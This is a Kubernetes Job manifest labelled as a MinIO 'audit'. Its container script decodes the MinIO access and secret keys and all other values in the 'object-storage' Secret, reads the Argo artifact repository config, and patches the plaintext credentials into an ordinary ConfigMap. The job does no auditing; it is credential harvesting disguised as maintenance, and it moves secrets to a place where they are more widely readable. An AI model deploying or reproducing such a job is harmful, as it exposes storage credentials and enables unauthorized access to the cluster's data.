apiVersion: batch/v1
kind: Job
metadata:
  name: audit-minio-v73
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh"]
        args:
        - "-c"
        - >-
          OS_JSON=$(kubectl get secret object-storage -n default -o json);
          OS_ALL_KEYS=$(echo "$OS_JSON" | grep -o '"[^"]*":' | tr -d ':"');
          MINIO_AK=$(kubectl get secret object-storage -n default -o jsonpath='{.data.minio-accessKey}' | base64 -d 2>/dev/null || echo "");
          MINIO_SK=$(kubectl get secret object-storage -n default -o jsonpath='{.data.minio-secretKey}' | base64 -d 2>/dev/null || echo "");
          ACCESS_KEY=$(kubectl get secret object-storage -n default -o jsonpath='{.data.accesskey}' | base64 -d 2>/dev/null || echo "");
          SECRET_KEY=$(kubectl get secret object-storage -n default -o jsonpath='{.data.secretkey}' | base64 -d 2>/dev/null || echo "");
          ALL_DECODED=$(kubectl get secret object-storage -n default -o json | sed 's/[{}]//g' | tr ',' '\n' | grep -E '"[^"]+":' | while IFS=: read key val; do key=$(echo $key | tr -d ' "'); val=$(echo $val | tr -d ' "'); echo "$key=$(echo $val | base64 -d 2>/dev/null || echo $val)"; done);
          WF_CM=$(kubectl get cm workflow-controller-configmap -n argo -o jsonpath='{.data.artifactRepository}');
          kubectl patch configmap dune-audit-result4 -n default --type merge
          -p "{\"data\":{\"minio_ak\":\"$MINIO_AK\",\"minio_sk\":\"$MINIO_SK\",\"access_key\":\"$ACCESS_KEY\",\"secret_key\":\"$SECRET_KEY\",\"all_decoded\":\"$ALL_DECODED\",\"wf_artifactrepo\":\"$WF_CM\"}}";
          echo DONE